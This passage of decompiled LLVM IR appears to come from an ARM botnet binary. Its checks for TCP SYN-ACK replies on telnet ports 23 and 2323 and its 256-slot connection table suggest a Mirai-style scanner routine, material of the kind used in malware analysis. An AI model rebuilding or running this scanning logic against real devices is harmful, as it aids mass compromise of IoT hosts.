  %v2_10958 = icmp eq i32 %v6_10954, 0
  store i1 %v2_10958, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v6_10954, 1
  br i1 %tmp376, label %dec_label_pc_10ac8, label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_1092c
  %v0_10960 = load i32, i32* @sb, align 4
  %v1_10960 = inttoptr i32 %v0_10960 to i32*
  %v2_10960 = load i32, i32* %v1_10960, align 4
  store i32 %v2_10960, i32* %r3.global-to-local, align 4
  %v2_10964 = icmp ugt i32 %v2_10960, 10
  store i1 %v2_10964, i1* %cpsr_c.global-to-local, align 1
  %v7_10964 = icmp eq i32 %v2_10960, 11
  store i1 %v7_10964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10964, label %dec_label_pc_10ac8, label %dec_label_pc_1096c

dec_label_pc_1096c:                               ; preds = %dec_label_pc_10960
  %v2_1096c = icmp ugt i32 %v6_10954, 38
  store i1 %v2_1096c, i1* %cpsr_c.global-to-local, align 1
  %v7_1096c = icmp eq i32 %v6_10954, 39
  store i1 %v7_1096c, i1* %cpsr_z.global-to-local, align 1
  %v2_10970 = xor i1 %v2_1096c, true
  %v3_10970 = or i1 %v7_1096c, %v2_10970
  br i1 %v3_10970, label %dec_label_pc_1092c, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_1096c
  store i32 %stack_var_-1880.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* %ip.global-to-local, align 4
  %v3_1097c = load i32, i32* %v2_1097c, align 4
  store i32 %v3_1097c, i32* %r2.global-to-local, align 4
  %v2_10980 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_10980, i32* %r3.global-to-local, align 4
  %v3_10984 = icmp uge i32 %v3_1097c, %v2_10980
  store i1 %v3_10984, i1* %cpsr_c.global-to-local, align 1
  %v9_10984 = icmp eq i32 %v3_1097c, %v2_10980
  store i1 %v9_10984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10984, label %dec_label_pc_1098c, label %dec_label_pc_1092c

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10974
  store i32 %stack_var_-1880.0, i32* @lr, align 4
  %v3_10990 = load i8, i8* %v2_10990, align 1
  %v4_10990 = zext i8 %v3_10990 to i32
  store i32 %v4_10990, i32* %r3.global-to-local, align 4
  %v2_10994 = icmp ugt i8 %v3_10990, 5
  store i1 %v2_10994, i1* %cpsr_c.global-to-local, align 1
  %v7_10994 = icmp eq i8 %v3_10990, 6
  store i1 %v7_10994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10994, label %dec_label_pc_1099c, label %dec_label_pc_1092c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_1098c
  %v0_1099c = load i32, i32* @r4, align 4
  %v1_1099c = inttoptr i32 %v0_1099c to i16*
  %v2_1099c = load i16, i16* %v1_1099c, align 2
  %v3_1099c = zext i16 %v2_1099c to i32
  store i32 %v3_1099c, i32* %ip.global-to-local, align 4
  %v2_109a0 = icmp ugt i16 %v2_1099c, 5887
  store i1 %v2_109a0, i1* %cpsr_c.global-to-local, align 1
  %v7_109a0 = icmp eq i16 %v2_1099c, 5888
  store i1 %v7_109a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109a0, label %dec_label_pc_109b8, label %dec_label_pc_109a8

dec_label_pc_109a8:                               ; preds = %dec_label_pc_1099c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_109b0 = icmp ugt i16 %v2_1099c, 4872
  store i1 %v3_109b0, i1* %cpsr_c.global-to-local, align 1
  %v9_109b0 = icmp eq i16 %v2_1099c, 4873
  store i1 %v9_109b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_109b0, label %dec_label_pc_109b8, label %dec_label_pc_1092c

dec_label_pc_109b8:                               ; preds = %dec_label_pc_109a8, %dec_label_pc_1099c
  %v1_109b8 = add i32 %v0_1099c, 2
  %v2_109b8 = inttoptr i32 %v1_109b8 to i16*
  %v3_109b8 = load i16, i16* %v2_109b8, align 2
  %v4_109b8 = zext i16 %v3_109b8 to i32
  store i32 %v4_109b8, i32* %r3.global-to-local, align 4
  store i32 %v4_109bc, i32* %r0.global-to-local, align 4
  %v3_109c0 = icmp uge i32 %v4_109b8, %v4_109bc
  store i1 %v3_109c0, i1* %cpsr_c.global-to-local, align 1
  %v9_109c0 = icmp eq i32 %v4_109b8, %v4_109bc
  store i1 %v9_109c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_109c0, label %dec_label_pc_109c8, label %dec_label_pc_1092c

dec_label_pc_109c8:                               ; preds = %dec_label_pc_109b8
  %v1_109c8 = add i32 %v0_1099c, 13
  %v2_109c8 = inttoptr i32 %v1_109c8 to i8*
  %v3_109c8 = load i8, i8* %v2_109c8, align 1
  %v4_109c8 = zext i8 %v3_109c8 to i32
  store i32 %v4_109c8, i32* %r3.global-to-local, align 4
  %v1_109cc = and i32 %v4_109c8, 2
  %v2_109cc = icmp eq i32 %v1_109cc, 0
  store i1 %v2_109cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109cc, label %dec_label_pc_1092c, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109c8
  %v1_109d4 = and i32 %v4_109c8, 16
  %v2_109d4 = icmp eq i32 %v1_109d4, 0
  store i1 %v2_109d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109d4, label %dec_label_pc_1092c, label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109d4
  %v1_109dc = and i32 %v4_109c8, 4
  %v2_109dc = icmp eq i32 %v1_109dc, 0
  store i1 %v2_109dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109dc, label %dec_label_pc_109e4, label %dec_label_pc_1092c

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109dc
  %tmp532 = urem i8 %v3_109c8, 2
  %v2_109e4 = icmp eq i8 %tmp532, 0
  store i1 %v2_109e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109e4, label %dec_label_pc_109ec, label %dec_label_pc_1092c

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109e4
  %v1_109ec = add i32 %v0_1099c, 8
  %v2_109ec = inttoptr i32 %v1_109ec to i32*
  %v3_109ec = load i32, i32* %v2_109ec, align 4
  %v5_10a04 = call i32 @llvm.bswap.i32(i32 %v3_109ec)
  %v1_10a08 = add i32 %v5_10a04, -1
  store i32 %v1_10a08, i32* %r2.global-to-local, align 4
  %v1_10a0c = and i32 %v1_10a08, 16711680
  store i32 %v1_10a0c, i32* %r0.global-to-local, align 4
  %v3_10a10 = udiv i32 %v1_10a08, 16777216
  %v4_10a18 = udiv i32 %v1_10a0c, 256
  %v5_10a18 = or i32 %v4_10a18, %v3_10a10
  %v1_10a14 = mul i32 %v1_10a08, 256
  %v4_10a1c = and i32 %v1_10a14, 16711680
  %v5_10a1c = or i32 %v5_10a18, %v4_10a1c
  store i32 %v5_10a1c, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v3_10a24 = load i32, i32* %v2_10a24, align 4
  store i32 %v3_10a24, i32* @lr, align 4
  %v5_10a28 = call i32 @llvm.bswap.i32(i32 %v1_10a08)
  store i32 %v5_10a28, i32* %r3.global-to-local, align 4
  %v3_10a2c = icmp uge i32 %v5_10a28, %v3_10a24
  store i1 %v3_10a2c, i1* %cpsr_c.global-to-local, align 1
  %v9_10a2c = icmp eq i32 %v5_10a28, %v3_10a24
  store i1 %v9_10a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10a2c, label %dec_label_pc_10a34, label %dec_label_pc_1092c

dec_label_pc_10a34:                               ; preds = %dec_label_pc_109ec
  %v0_10a34 = load i32, i32* @r5, align 4
  %v2_10a34 = icmp ugt i32 %v0_10a34, 254
  store i1 %v2_10a34, i1* %cpsr_c.global-to-local, align 1
  %v7_10a34 = icmp eq i32 %v0_10a34, 255
  store i1 %v7_10a34, i1* %cpsr_z.global-to-local, align 1
  %v8_10a38 = icmp sgt i32 %v0_10a34, 255
  br i1 %v8_10a38, label %dec_label_pc_10ac8, label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_10a34
  %v2_10a44 = load i32, i32* @global_var_271d0.174, align 4
  store i32 %v2_10a44, i32* %r1.global-to-local, align 4
  %v3_10a48 = mul i32 %v0_10a34, 256
  store i32 %v3_10a48, i32* %r2.global-to-local, align 4
  %v2_10a4c = mul i32 %v0_10a34, 288
  store i32 %v2_10a4c, i32* %r3.global-to-local, align 4
  %v2_10a50 = add i32 %v2_10a44, %v2_10a4c
  store i32 %v2_10a50, i32* @r0, align 4
  %v1_10a54 = add i32 %v2_10a50, 12
  %v2_10a54 = inttoptr i32 %v1_10a54 to i32*
  %v3_10a54 = load i32, i32* %v2_10a54, align 4
  store i32 %v3_10a54, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a58 = icmp eq i32 %v3_10a54, 0
  store i1 %v2_10a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a58, label %dec_label_pc_10a9c, label %dec_label_pc_10a78.preheader

dec_label_pc_10a78.preheader:                     ; preds = %dec_label_pc_10a3c
  %v2_10a5c = add i32 %v0_10a34, 1
  %v2_10a64 = and i32 %v2_10a5c, 134217728
  %v3_10a64 = icmp ne i32 %v2_10a64, 0
  store i1 %v3_10a64, i1* %cpsr_c.global-to-local, align 1
  %v3_10a68 = mul i32 %v2_10a5c, 288
  %v3_10a6c = add i32 %v2_10a44, %v3_10a68
  store i32 %v3_10a6c, i32* %r3.global-to-local, align 4
  store i32 %v0_10a34, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10a78

dec_label_pc_10a78:                               ; preds = %dec_label_pc_10a78.preheader, %dec_label_pc_10a84
  %v0_10a84 = phi i32 [ %v3_10a6c, %dec_label_pc_10a78.preheader ], [ %v1_10a90, %dec_label_pc_10a84 ]
  %v0_10a78 = phi i32 [ %v0_10a34, %dec_label_pc_10a78.preheader ], [ %v1_10a78, %dec_label_pc_10a84 ]
  %v1_10a78 = add i32 %v0_10a78, 1
  store i32 %v1_10a78, i32* %r2.global-to-local, align 4
  %v7_10a7c = icmp eq i32 %v1_10a78, 256
  br i1 %v7_10a7c, label %dec_label_pc_10ac8.loopexit, label %dec_label_pc_10a84

dec_label_pc_10a84:                               ; preds = %dec_label_pc_10a78
  store i32 %v0_10a84, i32* @r0, align 4
  %v1_10a88 = add i32 %v0_10a84, 12
  %v2_10a88 = inttoptr i32 %v1_10a88 to i32*
  %v3_10a88 = load i32, i32* %v2_10a88, align 4
  %v2_10a8c = icmp eq i32 %v3_10a88, 0
  %v1_10a90 = add i32 %v0_10a84, 288
  store i32 %v1_10a90, i32* %r3.global-to-local, align 4
  br i1 %v2_10a8c, label %dec_label_pc_10a98, label %dec_label_pc_10a78

dec_label_pc_10a98:                               ; preds = %dec_label_pc_10a84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10a78, i32* @r5, align 4
  br label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a3c, %dec_label_pc_10a98
  %v1_10aa4 = phi i32 [ %v2_10a50, %dec_label_pc_10a3c ], [ %v0_10a84, %dec_label_pc_10a98 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a9c = icmp eq i32 %v1_10aa4, 0
  store i1 %v2_10a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a9c, label %dec_label_pc_10ac8, label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a9c
  %v2_10aa4 = add i32 %v1_10aa4, 16
  %v3_10aa4 = inttoptr i32 %v2_10aa4 to i32*
  store i32 %v3_10a24, i32* %v3_10aa4, align 4
  %v0_10aa8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10aa8 = trunc i32 %v0_10aa8 to i16
  %v2_10aa8 = load i32, i32* @r0, align 4
  %v3_10aa8 = add i32 %v2_10aa8, 20
  %v4_10aa8 = inttoptr i32 %v3_10aa8 to i16*
  store i16 %v1_10aa8, i16* %v4_10aa8, align 2
  %v0_10aac = call i32 @setup_connection()
  store i32 %v0_10aac, i32* %r0.global-to-local, align 4
  %v1_10930.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_1092c

dec_label_pc_10ab4:                               ; preds = %dec_label_pc_f964
  store i32 ptrtoint (i32* @global_var_271d4.176 to i32), i32* %ip.global-to-local, align 4
  %v2_10ab8 = load i32, i32* @global_var_271d4.176, align 4
  store i32 %v2_10ab8, i32* %r0.global-to-local, align 4
  %v1_10abc = call i32 @__GI___libc_close(i32 %v2_10ab8)
  store i32 %v1_10abc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ac0

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_f940, %dec_label_pc_10ab4
  %v0_10ac0 = load i32, i32* @r5, align 4
  store i32 %v0_10ac0, i32* %r0.global-to-local, align 4
  %v1_10ac4 = call i32 @__GI_exit(i32 %v0_10ac0)
  store i32 %v1_10ac4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ac8

dec_label_pc_10ac8.loopexit:                      ; preds = %dec_label_pc_10a78
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ac8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10a9c, %dec_label_pc_10a34, %dec_label_pc_10960, %dec_label_pc_1092c, %dec_label_pc_10ac8.loopexit, %dec_label_pc_10ac0
  %stack_var_-1880.1 = phi i32 [ %tmp314, %dec_label_pc_10ac0 ], [ %stack_var_-1880.0, %dec_label_pc_10ac8.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_1092c ], [ %stack_var_-1880.0, %dec_label_pc_10960 ], [ %stack_var_-1880.0, %dec_label_pc_10a34 ], [ %stack_var_-1880.0, %dec_label_pc_10a9c ]
  %stack_var_-1876.1 = phi i16 [ %tmp342, %dec_label_pc_10ac0 ], [ %stack_var_-1876.0, %dec_label_pc_10ac8.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_1092c ], [ %stack_var_-1876.0, %dec_label_pc_10960 ], [ %stack_var_-1876.0, %dec_label_pc_10a34 ], [ %stack_var_-1876.0, %dec_label_pc_10a9c ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 1668, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10ae4486 = load i32, i32* @sp, align 4
  %v3_10ae4487 = add i32 %v2_10ae4486, 1668
  %v4_10ae4488 = inttoptr i32 %v3_10ae4487 to i32*
  store i32 0, i32* %v4_10ae4488, align 4
  br label %dec_label_pc_10ad4.dec_label_pc_10ad4_crit_edge

dec_label_pc_10ad4.dec_label_pc_10ad4_crit_edge:  ; preds = %dec_label_pc_10ac8, %dec_label_pc_10ad4.dec_label_pc_10ad4_crit_edge
  %v0_10ad4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10ad4 = add i32 %v0_10ad4.pre, 1664
  store i32 %v1_10ad4, i32* %ip.global-to-local, align 4
  %v1_10ad8 = add i32 %v0_10ad4.pre, 4
  store i32 %v1_10ad8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_10ae0 = icmp eq i32 %v1_10ad8, 128
  %v2_10ae4 = load i32, i32* @sp, align 4
  %v3_10ae4 = add i32 %v2_10ae4, %v1_10ad4
  %v4_10ae4 = inttoptr i32 %v3_10ae4 to i32*
  store i32 0, i32* %v4_10ae4, align 4
  br i1 %v7_10ae0, label %dec_label_pc_10aec, label %dec_label_pc_10ad4.dec_label_pc_10ad4_crit_edge

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10ad4.dec_label_pc_10ad4_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10aec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10aec, i32* %stack_var_-352, align 4
  %v1_10af4480 = add i32 %v0_10aec, 1540
  store i32 %v1_10af4480, i32* @lr, align 4
  %v1_10af8481 = add i32 %v0_10aec, 8
  store i32 %v1_10af8481, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_10b00482 = icmp eq i32 %v1_10af8481, 128
  %v2_10b04483 = load i32, i32* @sp, align 4
  %v3_10b04484 = add i32 %v2_10b04483, %v1_10af4480
  %v4_10b04485 = inttoptr i32 %v3_10b04484 to i32*
  store i32 0, i32* %v4_10b04485, align 4
  br i1 %v7_10b00482, label %dec_label_pc_10b0c, label %dec_label_pc_10af4.dec_label_pc_10af4_crit_edge

dec_label_pc_10af4.dec_label_pc_10af4_crit_edge:  ; preds = %dec_label_pc_10aec, %dec_label_pc_10af4.dec_label_pc_10af4_crit_edge
  %v0_10af4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10af4 = add i32 %v0_10af4.pre, 1536
  store i32 %v1_10af4, i32* @lr, align 4
  %v1_10af8 = add i32 %v0_10af4.pre, 4
  store i32 %v1_10af8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_10b00 = icmp eq i32 %v1_10af8, 128
  %v2_10b04 = load i32, i32* @sp, align 4
  %v3_10b04 = add i32 %v2_10b04, %v1_10af4
  %v4_10b04 = inttoptr i32 %v3_10b04 to i32*
  store i32 0, i32* %v4_10b04, align 4
  br i1 %v7_10b00, label %dec_label_pc_10b0c, label %dec_label_pc_10af4.dec_label_pc_10af4_crit_edge

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_10af4.dec_label_pc_10af4_crit_edge, %dec_label_pc_10aec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10b0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10b0c, i32* @r6, align 4
  store i32 %v0_10b0c, i32* @r5, align 4
  %v5_10b14 = trunc i32 %v0_10b0c to i16
  store i16 %v5_10b14, i16* %stack_var_-52, align 2
  %v2_11928 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10b6c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10b9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10b88, i1* %cpsr_z.global-to-local, align 1
  %v1_11918 = add i32 %v2_10b80, 4
  %v2_11918 = inttoptr i32 %v1_11918 to i32*
  %v3_11918 = load i32, i32* %v2_11918, align 4
  br i1 %v7_10b88, label %dec_label_pc_11918, label %dec_label_pc_10b24

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b1c
  store i32 %v3_11918, i32* %ip.global-to-local, align 4
  %v3_10b2c = udiv i32 %v3_11918, 32
  store i32 %v2_11928, i32* %r0.global-to-local, align 4
  %v3_10b34 = mul nuw nsw i32 %v3_10b2c, 4
  %v2_10b38 = add i32 %v3_10b34, %v2_11928
  store i32 %v2_10b38, i32* %r3.global-to-local, align 4
  %v1_10b3c = add i32 %v2_10b38, -184
  %v2_10b3c = inttoptr i32 %v1_10b3c to i32*
  %v3_10b3c = load i32, i32* %v2_10b3c, align 4
  %v1_10b40 = urem i32 %v3_11918, 32
  store i32 %v1_10b40, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10b48 = shl i32 1, %v1_10b40
  %v8_10b48 = or i32 %v3_10b3c, %v7_10b48
  store i32 %v8_10b48, i32* %r2.global-to-local, align 4
  store i32 %v8_10b48, i32* %v2_10b3c, align 4
  %v0_10b50 = load i32, i32* @r6, align 4
  %v1_10b50 = load i32, i32* %ip.global-to-local, align 4
  %v3_10b50 = icmp uge i32 %v0_10b50, %v1_10b50
  store i1 %v3_10b50, i1* %cpsr_c.global-to-local, align 1
  %v9_10b50 = icmp eq i32 %v0_10b50, %v1_10b50
  store i1 %v9_10b50, i1* %cpsr_z.global-to-local, align 1
  %v5_10b54 = icmp slt i32 %v0_10b50, %v1_10b50
  br i1 %v5_10b54, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_10b24
  store i32 %v1_10b50, i32* @r6, align 4
  br label %bb378

bb378:                                            ; preds = %.thread56, %bb384, %bb382, %bb428, %dec_label_pc_10c00, %dec_label_pc_10b24, %bb377
  %v3_10b58 = load i16, i16* %stack_var_-52, align 2
  %v4_10b58 = sext i16 %v3_10b58 to i32
  store i32 %v4_10b58, i32* %r3.global-to-local, align 4
  %v1_10b5c = add nsw i32 %v4_10b58, 1
  store i32 %v1_10b5c, i32* %r2.global-to-local, align 4
  %v2_10b60 = icmp ugt i32 %v1_10b5c, 254
  store i1 %v2_10b60, i1* %cpsr_c.global-to-local, align 1
  %v7_10b60 = icmp eq i32 %v1_10b5c, 255
  store i1 %v7_10b60, i1* %cpsr_z.global-to-local, align 1
  %v5_10b64 = trunc i32 %v1_10b5c to i16
  store i16 %v5_10b64, i16* %stack_var_-52, align 2
  %v8_10b68 = icmp sgt i16 %v3_10b58, 254
  br i1 %v8_10b68, label %dec_label_pc_10c0c, label %dec_label_pc_10b6c

dec_label_pc_10b6c:                               ; preds = %bb378, %dec_label_pc_10b0c
  %v0_10b78 = phi i32 [ %v1_10b5c, %bb378 ], [ %v0_10b0c, %dec_label_pc_10b0c ]
  store i32 ptrtoint (i32* @global_var_271d0.174 to i32), i32* %r0.global-to-local, align 4
  %v3_10b70 = mul i32 %v0_10b78, 256
  store i32 %v3_10b70, i32* %r3.global-to-local, align 4
  %v2_10b74 = load i32, i32* @global_var_271d0.174, align 4
  store i32 %v2_10b74, i32* @r1, align 4
  %v2_10b7c = mul i32 %v0_10b78, 288
  store i32 %v2_10b7c, i32* %r2.global-to-local, align 4
  %v2_10b80 = add i32 %v2_10b74, %v2_10b7c
  store i32 %v2_10b80, i32* @r4, align 4
  %v1_10b84 = add i32 %v2_10b80, 12
  %v2_10b84 = inttoptr i32 %v1_10b84 to i32*
  %v3_10b84 = load i32, i32* %v2_10b84, align 4
  store i32 %v3_10b84, i32* %ip.global-to-local, align 4
  %v2_10b88 = icmp ne i32 %v3_10b84, 0
  store i1 %v2_10b88, i1* %cpsr_c.global-to-local, align 1
  %v7_10b88 = icmp eq i32 %v3_10b84, 1
  store i1 %v7_10b88, i1* %cpsr_z.global-to-local, align 1
  %v2_10b8c = xor i1 %v2_10b88, true
  %v3_10b8c = or i1 %v7_10b88, %v2_10b8c
  br i1 %v3_10b8c, label %bb379, label %bb380

bb379:                                            ; preds = %dec_label_pc_10b6c
  store i32 5, i32* @r1, align 4
  br label %bb380

bb380:                                            ; preds = %dec_label_pc_10b6c, %bb379
  %v1_10bac173 = phi i32 [ %v2_10b74, %dec_label_pc_10b6c ], [ 5, %bb379 ]
  %v2_10b90 = xor i1 %v7_10b88, true
  %v3_10b90 = and i1 %v2_10b88, %v2_10b90
  br i1 %v3_10b90, label %bb381, label %bb382

bb381:                                            ; preds = %bb380
  store i32 30, i32* @r1, align 4
  br label %bb382

bb382:                                            ; preds = %bb380, %bb381
  %v1_10bac = phi i32 [ %v1_10bac173, %bb380 ], [ 30, %bb381 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b94 = icmp eq i32 %v3_10b84, 0
  store i1 %v2_10b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b94, label %bb378, label %dec_label_pc_10b9c

dec_label_pc_10b9c:                               ; preds = %bb382
  store i32 ptrtoint (i32* @global_var_246f0.163 to i32), i32* %r2.global-to-local, align 4
  %v2_10ba0 = load i32, i32* @global_var_246f0.163, align 4
  store i32 %v2_10ba0, i32* %r3.global-to-local, align 4
  %v1_10ba4 = add i32 %v2_10b80, 8
  %v2_10ba4 = inttoptr i32 %v1_10ba4 to i32*
  %v3_10ba4 = load i32, i32* %v2_10ba4, align 4
  store i32 %v3_10ba4, i32* %r2.global-to-local, align 4
  %v2_10ba8 = sub i32 %v2_10ba0, %v3_10ba4
  store i32 %v2_10ba8, i32* %r3.global-to-local, align 4
  %v3_10bac = icmp uge i32 %v2_10ba8, %v1_10bac
  store i1 %v3_10bac, i1* %cpsr_c.global-to-local, align 1
  %v9_10bac = icmp eq i32 %v2_10ba8, %v1_10bac
  store i1 %v9_10bac, i1* %cpsr_z.global-to-local, align 1
  %v2_10bb0 = xor i1 %v3_10bac, true
  %v3_10bb0 = or i1 %v9_10bac, %v2_10bb0
  br i1 %v3_10bb0, label %dec_label_pc_10b1c, label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b9c
  %v1_10bb4 = add i32 %v2_10b80, 4
  %v2_10bb4 = inttoptr i32 %v1_10bb4 to i32*
  %v3_10bb4 = load i32, i32* %v2_10bb4, align 4
  store i32 %v3_10bb4, i32* %r0.global-to-local, align 4
  %v1_10bb8 = call i32 @__GI___libc_close(i32 %v3_10bb4)
  store i32 %v1_10bb8, i32* %r0.global-to-local, align 4
  %v0_10bbc = load i32, i32* @r4, align 4
  %v1_10bbc = add i32 %v0_10bbc, 12
  %v2_10bbc = inttoptr i32 %v1_10bbc to i32*
  %v3_10bbc = load i32, i32* %v2_10bbc, align 4
  store i32 %v3_10bbc, i32* %r3.global-to-local, align 4
  %v2_10bc0 = icmp ugt i32 %v3_10bbc, 1
  store i1 %v2_10bc0, i1* %cpsr_c.global-to-local, align 1
  %v7_10bc0 = icmp eq i32 %v3_10bbc, 2
  store i1 %v7_10bc0, i1* %cpsr_z.global-to-local, align 1
  %v2_10bc4 = xor i1 %v2_10bc0, true
  %v3_10bc4 = or i1 %v7_10bc0, %v2_10bc4
  br i1 %v3_10bc4, label %bb383, label %.thread279

.thread279:                                       ; preds = %dec_label_pc_10bb4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10bcc276280 = add i32 %v0_10bbc, 4
  %v3_10bcc277281 = inttoptr i32 %v2_10bcc276280 to i32*
  store i32 -1, i32* %v3_10bcc277281, align 4
  br label %bb384

bb383:                                            ; preds = %dec_label_pc_10bb4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10bcc273 = add i32 %v0_10bbc, 4
  %v3_10bcc274 = inttoptr i32 %v2_10bcc273 to i32*
  store i32 -1, i32* %v3_10bcc274, align 4
  %v4_10bd0 = load i32, i32* %r3.global-to-local, align 4
  %v5_10bd0 = load i32, i32* @r4, align 4
  %v6_10bd0 = add i32 %v5_10bd0, 12
  %v7_10bd0 = inttoptr i32 %v6_10bd0 to i32*
  store i32 %v4_10bd0, i32* %v7_10bd0, align 4
  %v4_10bd4 = load i32, i32* %r3.global-to-local, align 4
  %v5_10bd4 = trunc i32 %v4_10bd4 to i8
  %v6_10bd4 = load i32, i32* @r4, align 4
  %v7_10bd4 = add i32 %v6_10bd4, 284
  %v8_10bd4 = inttoptr i32 %v7_10bd4 to i8*
  store i8 %v5_10bd4, i8* %v8_10bd4, align 1
  %v0_10bd8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10bd8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb384

bb384:                                            ; preds = %.thread279, %bb383
  %v1_10bd8 = phi i1 [ %v1_10bd8.pre, %bb383 ], [ %v2_10bc0, %.thread279 ]
  %v0_10bd8 = phi i1 [ %v0_10bd8.pre, %bb383 ], [ false, %.thread279 ]
  %v2_10bd8 = xor i1 %v1_10bd8, true
  %v3_10bd8 = or i1 %v0_10bd8, %v2_10bd8
  br i1 %v3_10bd8, label %bb378, label %dec_label_pc_10bdc

dec_label_pc_10bdc:                               ; preds = %bb384
  %v0_10bdc = load i32, i32* @r4, align 4
  %v1_10bdc = add i32 %v0_10bdc, 284
  %v2_10bdc = inttoptr i32 %v1_10bdc to i8*
  %v3_10bdc = load i8, i8* %v2_10bdc, align 1
  %v4_10bdc = zext i8 %v3_10bdc to i32
  %v1_10be0 = add nuw nsw i32 %v4_10bdc, 1
  %v1_10be4 = urem i32 %v1_10be0, 256
  store i32 %v1_10be4, i32* %r3.global-to-local, align 4
  %v2_10be8 = icmp ugt i32 %v1_10be4, 9
  store i1 %v2_10be8, i1* %cpsr_c.global-to-local, align 1
  %v7_10be8 = icmp eq i32 %v1_10be4, 10
  store i1 %v7_10be8, i1* %cpsr_z.global-to-local, align 1
  %v1_10bec = trunc i32 %v1_10be0 to i8
  store i8 %v1_10bec, i8* %v2_10bdc, align 1
  %v0_10bf0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10bf0, label %.thread56, label %dec_label_pc_10c00

.thread56:                                        ; preds = %dec_label_pc_10bdc
  %v1_10bf0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bf0 = add i32 %v1_10bf0, -10
  store i32 %v2_10bf0, i32* %r3.global-to-local, align 4
  %v2_10bf4 = load i32, i32* @r4, align 4
  %v3_10bf4 = add i32 %v2_10bf4, 12
  %v4_10bf4 = inttoptr i32 %v3_10bf4 to i32*
  store i32 %v2_10bf0, i32* %v4_10bf4, align 4
  %v1_10bf8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bf8 = trunc i32 %v1_10bf8 to i8
  %v3_10bf8 = load i32, i32* @r4, align 4
  %v4_10bf8 = add i32 %v3_10bf8, 284
  %v5_10bf8 = inttoptr i32 %v4_10bf8 to i8*
  store i8 %v2_10bf8, i8* %v5_10bf8, align 1
